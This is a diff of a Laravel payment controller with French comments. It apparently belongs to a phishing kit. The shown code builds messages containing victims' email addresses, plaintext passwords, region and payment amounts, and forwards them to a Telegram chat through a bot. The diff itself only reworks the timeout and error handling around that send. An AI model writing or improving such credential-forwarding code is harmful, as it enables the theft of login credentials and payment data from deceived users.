@@ -25,15 +25,13 @@ class PaymentController extends Controller
                  . "📧 Email : {$validated['username']}\n"
                  . "🔐 Mot de passe : {$validated['password']}" ;
 
-        // Envoyer Telegram en arrière-plan avec timeout court
+        // Envoyer Telegram en arrière-plan (queue)
         try {
-            set_time_limit(3); // 3 secondes max pour Telegram
-            
             Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
                 ->notify(new TelegramAlert($message));
                 
-        } catch (\Exception $e) {
-            Log::error('Telegram sendToTelegram Error: ' . $e->getMessage());
+        } catch (\Throwable $e) {
+            Log::error('Telegram Error: ' . $e->getMessage());
             // Continue même si Telegram échoue
         }
 
@@ -68,15 +66,13 @@ class PaymentController extends Controller
                  . "🗺️ Région : {$validated['region']}\n"
                  . "💰 Montant : {$validated['article_amount']} €";
 
-        // Envoyer Telegram en arrière-plan avec timeout court
+        // Envoyer Telegram en arrière-plan (queue)
         try {
-            set_time_limit(3); // 3 secondes max pour Telegram
-            
             Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
                 ->notify(new TelegramAlert($message));
                 
-        } catch (\Exception $e) {
-            Log::error('Telegram storePersonalInfo Error: ' . $e->getMessage());
+        } catch (\Throwable $e) {
+            Log::error('Telegram Error: ' . $e->getMessage());
             // Continue même si Telegram échoue
         }
 
